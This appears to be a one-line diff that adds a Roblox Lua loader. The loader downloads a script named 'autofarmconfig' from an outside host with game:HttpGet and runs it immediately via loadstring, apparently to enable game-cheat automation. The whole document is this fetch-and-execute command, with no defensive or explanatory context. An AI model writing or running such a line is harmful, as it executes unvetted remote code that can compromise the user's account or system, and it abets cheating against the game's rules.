@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://banbus.cf/scripts/autofarmconfig"))()
